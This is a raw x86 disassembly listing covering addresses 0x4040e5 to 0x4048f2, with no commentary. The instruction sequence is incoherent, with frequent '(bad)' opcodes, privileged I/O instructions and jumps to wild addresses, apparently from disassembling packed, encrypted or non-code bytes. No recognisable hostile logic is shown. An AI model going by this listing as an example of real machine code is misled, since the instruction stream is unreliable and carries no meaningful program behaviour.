  4040e5:	add    BYTE PTR [ebp+0xf],cl
  4040e8:	enter  0x8b2d,0xf6
  4040ec:	fwait
  4040ed:	mov    ch,0xf0
  4040ef:	mov    eax,0xaf460f81
  4040f4:	inc    ecx
  4040f5:	adc    ah,ch
  4040f7:	popfw  
  4040f9:	fdivr  st,st(5)
  4040fb:	pushf  
  4040fc:	mov    ds:0x89e43ae4,al
  404101:	pusha  
  404102:	icebp  
  404103:	pusha  
  404104:	dec    ebx
  404105:	sar    DWORD PTR ds:0xa049a75a,1
  40410b:	(bad)  
  40410c:	push   edx
  40410d:	cmc    
  40410e:	mov    ch,0xb6
  404110:	pop    edx
  404111:	scas   eax,DWORD PTR es:[edi]
  404112:	(bad)  
  404113:	jo     0x404138
  404115:	fdiv   QWORD PTR [esi+eiz*2-0x15]
  404119:	inc    eax
  40411a:	ficom  DWORD PTR [edi+ebp*1-0x7e]
  40411e:	mov    ebx,0xf9345ca6
  404123:	(bad)  
  404125:	sbb    esp,DWORD PTR [ebx-0x2f208203]
  40412b:	mov    DWORD PTR [ebx-0x19],edi
  40412e:	mov    ch,0x44
  404130:	ret    
  404131:	mov    BYTE PTR [esi+0x6609e0c1],al
  404137:	std    
  404138:	sub    ebp,edi
  40413a:	fwait
  40413b:	retf   
  40413c:	dec    ebp
  40413d:	test   esi,edx
  40413f:	pop    edi
  404140:	jge    0x404180
  404142:	pop    esi
  404143:	push   esi
  404144:	add    dl,cl
  404146:	sub    al,0xc6
  404148:	or     ch,cl
  40414a:	leave  
  40414b:	or     DWORD PTR [ecx-0x55ab1997],eax
  404151:	adc    al,bl
  404153:	adc    al,0x87
  404155:	xchg   esi,eax
  404156:	mov    esi,0x24fcb66c
  40415b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40415c:	clc    
  40415d:	rcl    BYTE PTR [eax+0x38],0x8a
  404161:	int3   
  404162:	add    al,0x28
  404164:	or     eax,0x3900672
  404169:	pop    esi
  40416a:	cmp    eax,DWORD PTR [ecx+0x4d]
  40416d:	xor    ebp,ebp
  40416f:	mov    esi,DWORD PTR [esi+eax*1+0x29]
  404173:	aam    0x98
  404175:	shl    eax,0x13
  404178:	cwde   
  404179:	push   ebp
  40417a:	daa    
  40417b:	mov    esp,0x83c2f4b8
  404180:	mov    ebx,0x93b73b28
  404185:	(bad)  
  404186:	ss mov dl,bh
  404189:	push   cs
  40418a:	sti    
  40418b:	mov    al,ds:0x95233eef
  404190:	pop    eax
  404191:	jecxz  0x4041d5
  404193:	sbb    eax,0x932b51e
  404198:	cmp    BYTE PTR [edx+0x27788108],bl
  40419e:	clc    
  40419f:	mov    BYTE PTR [edx],ch
  4041a1:	aam    0xf2
  4041a3:	call   0xb2ecf7e4
  4041a8:	int3   
  4041a9:	or     DWORD PTR [esi],0x49
  4041ac:	mov    ah,dh
  4041ae:	mov    edi,0x743aaccb
  4041b3:	les    edi,FWORD PTR fs:[ebx]
  4041b6:	push   eax
  4041b7:	mov    ch,0xc4
  4041b9:	add    al,0x88
  4041bb:	bound  esi,QWORD PTR [edi]
  4041bd:	add    ecx,ebx
  4041bf:	iret   
  4041c0:	push   es
  4041c1:	inc    eax
  4041c2:	in     al,0x25
  4041c4:	enter  0xfa2e,0x30
  4041c8:	aas    
  4041c9:	and    BYTE PTR [edx-0x21],al
  4041cc:	cmp    bl,ah
  4041ce:	loopne 0x404188
  4041d0:	adc    BYTE PTR [edx+0x2c0d14fe],dl
  4041d6:	sbb    al,0x58
  4041d8:	mov    ebp,0xb9186d94
  4041dd:	mov    ds:0xbd4ecd5f,eax
  4041e2:	hlt    
  4041e3:	adc    BYTE PTR [ecx],dl
  4041e5:	and    DWORD PTR [eax],0xffffffa0
  4041e8:	xchg   edx,eax
  4041e9:	repnz xchg ebx,eax
  4041eb:	aam    0x6c
  4041ed:	cmp    eax,DWORD PTR [ebp-0x67]
  4041f0:	sbb    bh,0xf2
  4041f3:	xchg   ebx,eax
  4041f4:	retf   
  4041f5:	arpl   WORD PTR [edi],dx
  4041f7:	sub    al,BYTE PTR [esi+0x74934dd]
  4041fd:	xchg   esp,eax
  4041fe:	xchg   esi,eax
  4041ff:	push   DWORD PTR [eax-0x6e]
  404202:	ins    BYTE PTR es:[edi],dx
  404203:	cmp    BYTE PTR [di],bh
  404206:	sbb    ch,bh
  404208:	mov    ebp,0x23e7d305
  40420d:	and    ebp,eax
  40420f:	mov    ecx,0xb7a82ff1
  404214:	adc    ecx,DWORD PTR [ebp-0x7ce412a3]
  40421a:	sbb    ch,BYTE PTR [edi+edx*8+0x61]
  40421e:	idiv   cl
  404220:	pop    edx
  404221:	inc    ebx
  404222:	jns    0x4041cb
  404224:	mov    esp,0xec1cb70
  404229:	jnp    0x4041ba
  40422b:	sub    esp,ebx
  40422d:	adc    DWORD PTR ds:0x7ea528e1,eax
  404233:	add    eax,0x2caa2710
  404238:	xchg   edx,eax
  404239:	sub    al,0x3b
  40423b:	(bad)  
  40423c:	(bad)  
  40423d:	sbb    al,0x7b
  40423f:	mov    bh,bl
  404241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404242:	inc    esi
  404243:	mov    BYTE PTR [ebx-0x79c40983],ah
  404249:	push   ebx
  40424a:	xor    DWORD PTR [edx+0x46],ebp
  40424d:	mov    ds:0xee77c723,al
  404252:	pop    eax
  404253:	dec    edi
  404254:	inc    esp
  404255:	cmp    al,0x21
  404257:	sbb    al,0x3b
  404259:	lods   al,BYTE PTR ds:[esi]
  40425a:	in     eax,dx
  40425b:	push   eax
  40425c:	hlt    
  40425d:	xchg   esi,eax
  40425e:	out    dx,eax
  40425f:	stos   DWORD PTR es:[edi],eax
  404260:	xchg   esi,eax
  404261:	retf   
  404262:	call   0xadea7a3a
  404267:	cdq    
  404268:	mov    ebp,0xdc683335
  40426d:	lea    eax,[ebx+esi*8+0x4b4d14c6]
  404274:	cmovp  eax,esp
  404277:	retf   0xb63f
  40427a:	push   ds
  40427b:	mov    edx,0xd930e36b
  404280:	or     ecx,edi
  404282:	fmul   st(5),st
  404284:	lea    esi,[esi+esi*4]
  404287:	nop
  404288:	cmp    bl,BYTE PTR [ebp-0x5c69085a]
  40428e:	xlat   BYTE PTR ds:[ebx]
  40428f:	ins    DWORD PTR es:[edi],dx
  404290:	jno    0x404271
  404292:	and    ebp,DWORD PTR [ecx+0x1a]
  404295:	jne    0x4042c7
  404297:	data16 jge 0x40423f
  40429a:	imul   ecx,esp,0x8ed88092
  4042a0:	sub    eax,0xf6a1211d
  4042a5:	mov    esi,0x81fbe185
  4042aa:	jmp    0x49d1162b
  4042af:	addr16 stc 
  4042b1:	cmp    DWORD PTR [edx],edx
  4042b3:	or     esi,DWORD PTR [edx+0x3e0853cc]
  4042b9:	imul   esp,DWORD PTR [edx+0x5f2f994c],0x8347a236
  4042c3:	inc    edx
  4042c4:	sti    
  4042c5:	sbb    cl,BYTE PTR [ecx-0x61105b07]
  4042cb:	addr16 inc esp
  4042cd:	inc    ecx
  4042ce:	push   es
  4042cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d0:	jle    0x4042f0
  4042d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042d3:	inc    eax
  4042d4:	push   es
  4042d5:	das    
  4042d6:	pop    ds
  4042d7:	test   al,0xd
  4042d9:	xchg   ebx,eax
  4042da:	dec    eax
  4042db:	mov    ebp,0x175dd2e8
  4042e0:	lods   al,BYTE PTR ds:[esi]
  4042e1:	pop    ds
  4042e2:	xchg   ebx,eax
  4042e3:	mov    BYTE PTR [ecx],0x73
  4042e6:	es inc edx
  4042e8:	cmp    eax,0x4d9f4eb9
  4042ed:	cmp    eax,0x8ac119ba
  4042f2:	lock ret 
  4042f4:	or     DWORD PTR [ebp+0x22b98898],ebx
  4042fa:	dec    edx
  4042fb:	outs   dx,BYTE PTR ds:[esi]
  4042fc:	xor    BYTE PTR ds:0x9b7a6875,ah
  404302:	pop    ss
  404303:	fadd   st,st(3)
  404305:	add    al,0x5f
  404307:	shl    edi,cl
  404309:	adc    al,0x1
  40430b:	xor    eax,0x7474ef86
  404310:	cmp    bl,ah
  404312:	jge    0x404364
  404314:	jge    0x404344
  404316:	pop    ebx
  404317:	push   ebx
  404318:	int3   
  404319:	ret    
  40431a:	jmp    0xe2c3f654
  40431f:	mov    ebp,0xf8218bce
  404324:	mov    BYTE PTR [edi],dh
  404326:	lds    edx,FWORD PTR [eax-0x15]
  404329:	or     al,0xa2
  40432b:	shl    BYTE PTR [esi-0x36fd88e],1
  404331:	jecxz  0x40439a
  404333:	sub    esp,edx
  404335:	je     0x4042f9
  404337:	cli    
  404338:	enter  0xeaea,0xa1
  40433c:	lock or al,0xc7
  40433f:	mov    ch,0x1a
  404341:	mov    eax,ds:0x8c2de349
  404346:	jmp    0x40436b
  404348:	call   0x7e54:0x72960a72
  40434f:	imul   BYTE PTR [ecx]
  404351:	fwait
  404352:	fs cmp al,0xb9
  404355:	xor    BYTE PTR [esi-0x379bd68b],ch
  40435b:	adc    eax,DWORD PTR cs:[eax]
  40435e:	mov    ecx,DWORD PTR [ebp+0x6fc61ad]
  404364:	sub    esp,DWORD PTR [eax+0x43b589a5]
  40436a:	and    eax,0x54abeb1
  40436f:	(bad)  
  404370:	cld    
  404371:	pop    es
  404372:	int3   
  404373:	jmp    0x40435e
  404375:	repz test BYTE PTR [ebp+0x73],0x57
  40437a:	dec    ebx
  40437b:	pop    ebp
  40437c:	pop    ebp
  40437d:	in     eax,0x1c
  40437f:	dec    edi
  404380:	add    dl,bh
  404382:	adc    al,0x88
  404384:	inc    edx
  404385:	inc    ebp
  404386:	and    edx,DWORD PTR [ebx]
  404388:	lahf   
  404389:	fisubr WORD PTR [eax]
  40438b:	pusha  
  40438c:	sub    al,0x5b
  40438e:	aas    
  40438f:	pushf  
  404390:	xchg   ebp,eax
  404391:	or     BYTE PTR [ecx-0x59ecb53],al
  404397:	jb     0x404383
  404399:	fwait
  40439a:	lods   eax,DWORD PTR ds:[esi]
  40439b:	pusha  
  40439c:	xchg   edi,eax
  40439d:	adc    esp,0x536053ad
  4043a3:	mov    DWORD PTR [ebp-0x4c],0x61437f8c
  4043aa:	call   DWORD PTR [ecx]
  4043ac:	cwde   
  4043ad:	push   ds
  4043ae:	aam    0xbc
  4043b0:	fwait
  4043b1:	sti    
  4043b2:	loope  0x404361
  4043b4:	retf   
  4043b5:	mov    cl,0x82
  4043b7:	push   0xe
  4043b9:	inc    ebp
  4043ba:	or     al,BYTE PTR [ecx-0x1dbb700e]
  4043c0:	hlt    
  4043c1:	and    DWORD PTR [edx+esi*4+0x3bb30929],esi
  4043c8:	add    al,0x72
  4043ca:	inc    esi
  4043cb:	mov    WORD PTR [ebx-0x5],ds
  4043ce:	dec    esp
  4043cf:	pop    esi
  4043d0:	jns    0x404439
  4043d2:	rcl    BYTE PTR [esi],1
  4043d4:	fwait
  4043d5:	leave  
  4043d6:	ins    DWORD PTR es:[edi],dx
  4043d7:	ret    0x8c54
  4043da:	mov    WORD PTR [bp+si],cs
  4043dd:	cs push cs
  4043df:	pushf  
  4043e0:	or     BYTE PTR [esi],dh
  4043e2:	call   0xa193:0x77b6aa58
  4043e9:	dec    eax
  4043ea:	shl    DWORD PTR [edx-0x5ca737ce],1
  4043f0:	adc    bh,BYTE PTR [ecx+ebx*8+0x75]
  4043f4:	cmp    bl,BYTE PTR [edi]
  4043f6:	sbb    BYTE PTR [edi+0x5314f66e],al
  4043fc:	mov    esp,0x8aaf61cb
  404401:	lods   eax,DWORD PTR ds:[esi]
  404402:	sbb    BYTE PTR [edx-0x77],bh
  404405:	jmp    0x40446d
  404407:	jo     0x404401
  404409:	call   0x5c4f:0x26e2c12f
  404410:	push   ds
  404411:	pushf  
  404412:	rol    DWORD PTR [edi+0x1b],cl
  404415:	mov    edi,DWORD PTR [ebx-0x7e]
  404418:	sub    DWORD PTR [esi+0x2cd00074],edi
  40441e:	lock mov ds:0x49087aff,al
  404424:	out    dx,eax
  404425:	mov    al,0x77
  404427:	and    al,0x19
  404429:	sahf   
  40442a:	int    0x60
  40442c:	cdq    
  40442d:	jl     0x404434
  40442f:	mov    dh,0x74
  404431:	add    al,0xea
  404433:	pop    es
  404434:	pop    esp
  404435:	sahf   
  404436:	xchg   edx,eax
  404437:	in     eax,dx
  404438:	pop    edi
  404439:	mov    bl,0xff
  40443b:	mov    al,0x89
  40443d:	cmc    
  40443e:	je     0x404421
  404440:	cli    
  404441:	mov    edi,0x7021344a
  404446:	sub    al,0xbe
  404448:	div    DWORD PTR [ebp+0x59]
  40444b:	mov    al,ds:0xab8dc958
  404450:	js     0x404462
  404452:	adc    DWORD PTR [ebx],ecx
  404454:	mov    edx,0x4cc48a2e
  404459:	pop    es
  40445a:	lods   eax,DWORD PTR ds:[esi]
  40445b:	outs   dx,DWORD PTR ds:[esi]
  40445c:	(bad)  
  40445d:	test   al,0x46
  404460:	loopne 0x40449e
  404462:	call   0xc9645501
  404467:	add    bh,0xd7
  40446a:	and    al,0x40
  40446c:	and    BYTE PTR [ecx+0x45],dh
  40446f:	(bad)  
  404470:	jg     0x404476
  404472:	daa    
  404473:	jmp    0xd0af04b5
  404478:	fcmovu st,st(3)
  40447a:	aam    0x67
  40447c:	mov    bh,0xf2
  40447e:	and    esp,DWORD PTR [ebx+ecx*2-0x21]
  404482:	push   0xf3c2f24f
  404487:	mov    eax,0xd57e296d
  40448c:	inc    eax
  40448d:	jmp    0x40446d
  40448f:	adc    DWORD PTR [edi-0x5bb196ae],edi
  404495:	into   
  404496:	loopne 0x40442c
  404498:	in     eax,0x54
  40449a:	fdivr  st,st(1)
  40449c:	pop    edi
  40449d:	out    dx,al
  40449e:	pop    es
  40449f:	jp     0x404484
  4044a1:	xor    eax,0xf8f95cc
  4044a6:	mov    ebp,0x7c1eadc
  4044ab:	ror    BYTE PTR [ebp-0x3ac1aec3],0x7a
  4044b2:	mov    BYTE PTR es:0x35aaa54b,bh
  4044b9:	pushf  
  4044ba:	fdiv   QWORD PTR [ecx]
  4044bc:	mov    dl,BYTE PTR [ebp+0x552ce61d]
  4044c2:	inc    ebp
  4044c3:	arpl   WORD PTR [ecx-0x5ddf7deb],dx
  4044c9:	lahf   
  4044ca:	xchg   edx,eax
  4044cb:	mov    edi,0x3d130d0f
  4044d0:	or     edi,eax
  4044d2:	push   cs
  4044d3:	sbb    eax,0x5a9db1ab
  4044d8:	push   ebp
  4044d9:	lods   al,BYTE PTR ds:[esi]
  4044da:	inc    ebx
  4044db:	push   eax
  4044dc:	retf   
  4044dd:	test   DWORD PTR [esp+ebp*8],eax
  4044e0:	rcr    ch,0xb7
  4044e3:	add    esp,DWORD PTR [esi-0x39]
  4044e6:	jne    0x404495
  4044e8:	(bad)  
  4044e9:	rcl    al,1
  4044eb:	push   ebx
  4044ec:	(bad)  
  4044ed:	xchg   edx,eax
  4044ee:	retf   0x2eef
  4044f1:	repnz mov ebx,0xabd75aed
  4044f7:	aas    
  4044f8:	and    eax,0xe74056fb
  4044fd:	adc    eax,0x7af7a27
  404502:	pop    es
  404503:	inc    eax
  404504:	add    DWORD PTR [ebx+0x15],esp
  404507:	das    
  404508:	lods   eax,DWORD PTR ds:[esi]
  404509:	cmp    ecx,esi
  40450b:	repnz xor al,0xb9
  40450e:	popf   
  40450f:	or     BYTE PTR es:[edx-0x63878daa],ch
  404516:	mov    dl,0x2b
  404518:	mov    al,0x4
  40451a:	mov    eax,0x8e211bef
  40451f:	jne    0x4044dd
  404521:	and    al,0x19
  404523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404524:	fmul   st(6),st
  404526:	aaa    
  404527:	in     eax,dx
  404528:	lds    ebx,FWORD PTR [ecx]
  40452a:	pop    edi
  40452b:	cld    
  40452c:	std    
  40452d:	lock cwde 
  40452f:	lea    esi,[edi-0x4e982b65]
  404535:	xchg   ecx,eax
  404536:	mov    BYTE PTR [ecx+eiz*4],bl
  404539:	dec    ebp
  40453a:	dec    ecx
  40453b:	repnz test BYTE PTR [ebx+0x484ec950],0x40
  404543:	adc    ch,BYTE PTR [ebx-0x6f06dc21]
  404549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454a:	je     0x40452d
  40454c:	dec    ecx
  40454d:	loop   0x40451f
  40454f:	ficomp WORD PTR [esi]
  404551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404552:	icebp  
  404553:	jecxz  0x4045b9
  404555:	inc    ebx
  404556:	cmc    
  404557:	jp     0x40451b
  404559:	sbb    eax,0xe1b79705
  40455e:	add    eax,DWORD PTR [esp+ecx*4+0x0]
  404562:	adc    DWORD PTR [edi-0x2a],ecx
  404565:	pop    eax
  404566:	test   al,0x7a
  404568:	xor    bh,BYTE PTR [esi-0x1a016227]
  40456e:	xchg   esp,eax
  40456f:	ror    BYTE PTR [edx],0x19
  404572:	cmp    ebx,eax
  404574:	fistp  WORD PTR [edx-0x79]
  404577:	or     al,0x1d
  404579:	ins    BYTE PTR es:[edi],dx
  40457a:	test   DWORD PTR [esi+ebp*1-0x14eb6ceb],esp
  404581:	sub    ecx,DWORD PTR [ebp+edx*4+0x30e5b108]
  404588:	gs popa 
  40458a:	das    
  40458b:	pop    esi
  40458c:	or     DWORD PTR [eax-0x12210928],0xffffffaf
  404593:	in     al,0x76
  404595:	push   edx
  404596:	or     al,cl
  404598:	dec    eax
  404599:	out    0x35,eax
  40459b:	sbb    BYTE PTR [edx-0x794c8207],bh
  4045a1:	jbe    0x40455f
  4045a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a4:	push   0x4058185e
  4045a9:	and    BYTE PTR [eax+0x5497688b],ch
  4045af:	iret   
  4045b0:	mov    ecx,0x42df117d
  4045b5:	daa    
  4045b6:	sbb    esp,DWORD PTR [ecx+0x76b5b6e7]
  4045bc:	sbb    edi,DWORD PTR [ecx-0x22]
  4045bf:	aaa    
  4045c0:	xchg   esp,eax
  4045c1:	lea    ebx,[eax]
  4045c3:	jo     0x4045e1
  4045c5:	xchg   ebx,eax
  4045c6:	jnp    0x4045a4
  4045c8:	jns    0x40463e
  4045ca:	push   0x7074ce2f
  4045cf:	shr    BYTE PTR [edx],1
  4045d1:	and    BYTE PTR [esp+ecx*1+0x2eff2957],dl
  4045d8:	xchg   esi,eax
  4045d9:	jmp    0xe73a:0x3543bfa1
  4045e0:	je     0x4045e2
  4045e2:	sub    BYTE PTR [ebp+0x7d],cl
  4045e5:	popf   
  4045e6:	mov    edx,0xf991bea
  4045eb:	cmp    ch,dl
  4045ed:	ss aas 
  4045ef:	mov    ch,0x13
  4045f1:	rcr    edx,1
  4045f3:	mov    dh,0x9d
  4045f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f6:	out    dx,eax
  4045f7:	lock pop edx
  4045f9:	push   ds
  4045fa:	dec    ebp
  4045fb:	or     BYTE PTR [ecx-0x3350150e],bl
  404601:	mov    ecx,0xf64d82c
  404606:	std    
  404607:	sub    eax,0xe14b0b76
  40460c:	mov    gs,WORD PTR [ebp+0x19]
  40460f:	jmp    0x1839:0xccfe6a6a
  404616:	cwde   
  404617:	adc    BYTE PTR [edx+0x51],bh
  40461a:	mov    ch,0x53
  40461c:	inc    eax
  40461d:	mov    eax,ds:0xe2e569
  404622:	cld    
  404623:	mov    esp,0x2ec8bd2d
  404628:	jnp    0x404646
  40462a:	inc    esp
  40462b:	mov    esp,0x71c987a3
  404630:	rcl    esp,0xd
  404633:	stos   DWORD PTR es:[edi],eax
  404634:	cwde   
  404635:	jg     0x40460a
  404637:	mov    esp,DWORD PTR [edi+0x6a474dc5]
  40463d:	outs   dx,DWORD PTR ds:[esi]
  40463e:	cwde   
  40463f:	cli    
  404640:	data16 adc bl,ah
  404643:	jno    0x40469e
  404645:	xor    ebp,eax
  404647:	nop
  404648:	icebp  
  404649:	adc    eax,0xb66417f5
  40464e:	repz dec edx
  404650:	ficom  WORD PTR [eax-0x67b1f9f]
  404656:	sub    BYTE PTR [edi+0x42e55697],ch
  40465c:	jno    0x404681
  40465e:	(bad)  
  40465f:	adc    eax,0x8d40e6db
  404664:	jns    0x4046d9
  404666:	or     al,BYTE PTR [eax+ebp*1+0x4347e089]
  40466d:	mov    BYTE PTR [ebp+0x72],al
  404670:	mov    esi,0x3833f871
  404675:	retf   0xd31d
  404678:	les    edi,FWORD PTR [ebx-0x6c77d1da]
  40467e:	(bad)  
  40467f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404680:	aad    0xfa
  404682:	push   es
  404683:	stc    
  404684:	leave  
  404685:	pop    ss
  404686:	into   
  404687:	bound  edi,QWORD PTR [ebp-0x32]
  40468a:	mov    eax,0x33d041e3
  40468f:	cs jae 0x4046dd
  404692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404693:	popa   
  404694:	mov    bh,0xdb
  404696:	push   ss
  404697:	out    0x6d,eax
  404699:	cmp    DWORD PTR [ebp-0x59],ecx
  40469c:	dec    ecx
  40469d:	push   cs
  40469e:	mov    ebx,0x40dd5856
  4046a3:	push   0x746aad80
  4046a8:	push   esi
  4046a9:	push   edx
  4046aa:	add    eax,0x94a3c2a0
  4046af:	xchg   ebp,eax
  4046b0:	lods   al,BYTE PTR ds:[esi]
  4046b1:	cmp    al,0x90
  4046b3:	or     BYTE PTR [ebx+0x12a07b38],bl
  4046b9:	jne    0x4046c7
  4046bb:	pop    ss
  4046bc:	xchg   edx,eax
  4046bd:	xchg   esi,eax
  4046be:	sbb    al,0xe6
  4046c0:	(bad)  
  4046c1:	pop    eax
  4046c2:	push   ss
  4046c3:	loope  0x40472d
  4046c5:	jne    0x404710
  4046c7:	jno    0x404682
  4046c9:	lods   al,BYTE PTR ds:[esi]
  4046ca:	cmp    al,0xac
  4046cc:	dec    esi
  4046cd:	inc    ecx
  4046ce:	xchg   DWORD PTR [edx+0x2bd44bc6],ecx
  4046d4:	jo     0x404713
  4046d6:	pop    es
  4046d7:	add    DWORD PTR [ebx+0x5e],eax
  4046da:	xchg   ebp,eax
  4046db:	shr    DWORD PTR [ebx-0x6f2c48b4],cl
  4046e1:	leave  
  4046e2:	mov    BYTE PTR [esi+0x58],bh
  4046e5:	dec    esp
  4046e6:	ret    0x6810
  4046e9:	loope  0x4046a0
  4046eb:	adc    DWORD PTR [ebx+edi*2],esp
  4046ee:	int    0xa
  4046f0:	adc    edx,ebp
  4046f2:	data16 or al,BYTE PTR [edi]
  4046f5:	ror    bh,1
  4046f7:	stc    
  4046f8:	cmp    al,0x1d
  4046fa:	jbe    0x4046c3
  4046fc:	mov    dl,0x4a
  4046fe:	mov    dh,0xa1
  404700:	ficomp DWORD PTR [ecx-0x3d03eb04]
  404706:	in     eax,0x87
  404708:	or     edx,DWORD PTR [esi-0x9]
  40470b:	add    DWORD PTR [esi-0x5b],ecx
  40470e:	xor    DWORD PTR [ebx-0x51dc28f1],edi
  404714:	mov    esi,0x46cec904
  404719:	ret    0x18e6
  40471c:	jecxz  0x4046dd
  40471e:	les    esi,FWORD PTR [edx]
  404720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404721:	xor    al,0x21
  404723:	mov    ss,ebx
  404725:	push   ds
  404726:	mov    edx,0x513433fa
  40472b:	xlat   BYTE PTR ds:[ebx]
  40472c:	outs   dx,BYTE PTR ds:[esi]
  40472d:	push   ebp
  40472e:	ror    DWORD PTR [ecx+0x5fc65e3],cl
  404734:	loopne 0x4047ad
  404736:	or     eax,0x947584fa
  40473b:	xor    al,0xba
  40473d:	jb     0x404727
  40473f:	adc    edi,esp
  404741:	and    eax,DWORD PTR [ebx-0x7c4e6d66]
  404747:	sub    BYTE PTR [ebx-0x10333dbb],ch
  40474d:	push   cs
  40474e:	(bad)  
  40474f:	or     esi,DWORD PTR [edx-0x43]
  404752:	neg    BYTE PTR [edi+0x7f]
  404755:	pop    edi
  404756:	mov    dh,0x25
  404758:	(bad)  
  40475b:	imul   DWORD PTR [esi-0x5f]
  40475e:	pusha  
  40475f:	or     eax,DWORD PTR [eax+0x72702602]
  404765:	jmp    0xe224:0x6775b29
  40476c:	add    edi,esp
  40476e:	call   0x3686e55f
  404773:	cs fs push esi
  404776:	inc    ecx
  404777:	lock push eax
  404779:	ret    
  40477a:	ret    0x9b80
  40477d:	push   ds
  40477e:	mov    ebx,0x7318dc83
  404783:	sahf   
  404784:	add    DWORD PTR [edx-0x1],0x54
  404788:	scas   al,BYTE PTR es:[edi]
  404789:	push   0x7d
  40478b:	mov    al,0x25
  40478d:	fld    TBYTE PTR [ebx+0x1a4fff31]
  404793:	gs popf 
  404795:	mov    ds:0xde5ce12e,eax
  40479a:	rcl    BYTE PTR [edi+0x1b],cl
  40479d:	sub    al,BYTE PTR [esi]
  40479f:	and    al,0x7e
  4047a1:	leave  
  4047a2:	jae    0x404743
  4047a4:	inc    ecx
  4047a5:	push   ebp
  4047a6:	(bad)  
  4047a7:	mov    ebx,0x2a291198
  4047ac:	call   0xdae218cc
  4047b1:	jg     0x40473b
  4047b3:	sub    esp,0xa2f44add
  4047b9:	vpsubb ymm0{k4},ymm5,DWORD PTR [ebp+0x124]{1to8}
  4047c0:	repnz ins DWORD PTR es:[edi],dx
  4047c2:	dec    ebx
  4047c3:	inc    edx
  4047c4:	cmc    
  4047c5:	adc    al,0xa0
  4047c7:	shl    DWORD PTR [edi+0x76a3ec10],1
  4047cd:	in     eax,0xdb
  4047cf:	lds    ebp,FWORD PTR [edi-0x70]
  4047d2:	cmp    eax,0x6c8231ab
  4047d7:	sbb    dl,BYTE PTR [esi]
  4047d9:	dec    ebx
  4047da:	and    eax,0x176a2fe2
  4047df:	out    0x6e,al
  4047e1:	jnp    0x404767
  4047e3:	es cld 
  4047e5:	lds    esi,FWORD PTR [esi-0x15]
  4047e8:	mov    ecx,0x92955cf6
  4047ed:	jmp    0xf13efbaf
  4047f2:	ja     0x4047d2
  4047f4:	mov    bl,0x7e
  4047f6:	popa   
  4047f7:	ss xchg edx,eax
  4047f9:	rol    eax,cl
  4047fb:	stc    
  4047fc:	mov    bl,0x49
  4047fe:	fnstcw WORD PTR ds:0xa6a4d4bb
  404804:	imul   edi,DWORD PTR ds:0x921d1820,0xb4f375ee
  40480e:	pop    ss
  40480f:	pop    esi
  404810:	or     BYTE PTR [edi+0x27ee96e0],bh
  404816:	sbb    DWORD PTR [edx+eiz*2],edi
  404819:	loopne 0x404850
  40481b:	and    dh,dh
  40481d:	add    BYTE PTR [eax],0x3a
  404820:	bound  ebp,QWORD PTR [ecx]
  404822:	imul   eax,DWORD PTR [ebx-0x4d62d72c],0xc
  404829:	xor    DWORD PTR [edi],edx
  40482b:	(bad)  
  40482c:	xchg   esp,eax
  40482d:	mov    cl,0x67
  40482f:	xor    DWORD PTR [bx+di],edx
  404832:	iret   
  404833:	mov    dl,0x6a
  404835:	push   esi
  404836:	inc    edx
  404837:	shl    DWORD PTR [esi],cl
  404839:	test   al,0xdc
  40483b:	dec    ecx
  40483c:	pusha  
  40483d:	push   edx
  40483e:	inc    ebx
  40483f:	daa    
  404840:	mov    ds:0xbbd3bed3,al
  404845:	push   ebx
  404846:	cmp    al,0x43
  404848:	adc    eax,0x2d699e7c
  40484d:	test   eax,0x45d95750
  404852:	or     ebp,DWORD PTR [eax]
  404854:	int    0x48
  404856:	mov    eax,ds:0x3ad04ad7
  40485b:	fbstp  TBYTE PTR [edi]
  40485d:	xchg   ecx,eax
  40485e:	aad    0x65
  404860:	sub    DWORD PTR [eax],ebx
  404862:	adc    bl,BYTE PTR [ecx+0x32]
  404865:	pop    ss
  404866:	sti    
  404867:	ins    DWORD PTR es:[edi],dx
  404868:	sub    al,0x8c
  40486b:	cmp    al,0x27
  40486d:	out    0x94,eax
  40486f:	jne    0x4048b4
  404871:	jno    0x404822
  404873:	dec    ebx
  404874:	and    edx,DWORD PTR [esi]
  404876:	push   es
  404877:	cmp    dl,bl
  404879:	addr16 test al,0x28
  40487c:	and    eax,DWORD PTR [eax-0x53c8144f]
  404882:	sbb    esi,esi
  404884:	and    DWORD PTR [edx-0x519062c4],eax
  40488a:	xor    cl,BYTE PTR [esi-0x2022303e]
  404890:	push   edx
  404891:	jge    0x404836
  404893:	dec    edx
  404894:	stos   BYTE PTR es:[edi],al
  404895:	adc    al,0xaa
  404897:	xchg   DWORD PTR [eax+0x7b0e0a30],edi
  40489d:	mov    gs,ebp
  40489f:	jmp    0x27ec:0x4982f7bc
  4048a6:	fisttp DWORD PTR ds:0x372108d8
  4048ac:	fcomi  st,st(5)
  4048ae:	mov    BYTE PTR [ebx],dh
  4048b0:	and    BYTE PTR [edx+0x17],dl
  4048b3:	call   0x2829d7bd
  4048b8:	sbb    ebp,DWORD PTR [eax-0x17cff06e]
  4048be:	or     dl,ah
  4048c0:	push   edi
  4048c1:	xlat   BYTE PTR ds:[ebx]
  4048c2:	shl    BYTE PTR [edx],0xc9
  4048c5:	pop    ebp
  4048c6:	pop    ecx
  4048c7:	hlt    
  4048c8:	addr16 xor al,0x66
  4048cb:	adc    eax,0x84bb0d0a
  4048d0:	out    0x6f,al
  4048d2:	pop    ds
  4048d3:	addr16 nop
  4048d5:	xchg   DWORD PTR [eax-0x64],esp
  4048d8:	out    0xa4,al
  4048da:	lods   al,BYTE PTR ds:[esi]
  4048db:	push   ss
  4048dc:	and    DWORD PTR gs:[ecx+0x20],edx
  4048e0:	and    ecx,edx
  4048e2:	out    0x8c,al
  4048e4:	xor    ah,al
  4048e6:	and    dl,BYTE PTR [ecx]
  4048e8:	bound  esi,QWORD PTR [ecx-0x1c981239]
  4048ee:	jb     0x404877
  4048f0:	jnp    0x40496d
  4048f2:	out    0xc0,eax
